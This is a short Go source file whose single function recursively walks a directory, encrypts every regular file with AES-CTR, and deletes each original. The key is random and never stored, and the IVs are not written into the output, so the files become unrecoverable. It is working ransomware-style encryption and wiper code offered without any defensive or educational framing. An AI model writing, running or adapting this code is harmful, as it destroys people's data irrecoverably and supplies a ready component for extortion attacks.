package encrypt

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"io/fs"
	"log"
	"os"
	"path/filepath"
)

func EncryptFiles(targetDirectory string) error {
	log.Printf("Encrypting all files in %s...", targetDirectory)
	var cipherBlockBytes = make([]byte, 32)
	rand.Read(cipherBlockBytes)
	cipherBlock, err := aes.NewCipher(cipherBlockBytes)
	if err != nil {
		return fmt.Errorf("could not create cipher: %w", err)
	}
	return filepath.WalkDir(targetDirectory, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return nil
		}
		if !d.Type().IsRegular() {
			return nil
		}
		if filepath.Ext(path) == ".enc" {
			return nil
		}
		file, err := os.Open(path)
		if err != nil {
			return err
		}
		defer file.Close()
		encryptedFileName := path + ".enc"
		encryptedFile, err := os.Create(encryptedFileName)
		if err != nil {
			return err
		}
		defer encryptedFile.Close()
		iv := make([]byte, aes.BlockSize)
		rand.Read(iv)
		stream := cipher.NewCTR(cipherBlock, iv)
		cryptoWriter := cipher.StreamWriter{
			S:   stream,
			W:   encryptedFile,
		}
		if _, err := io.Copy(cryptoWriter, file); err != nil {
			return err
		}
		file.Close()
		if err := os.Remove(path); err != nil {
			return err
		}
		return nil
	})
}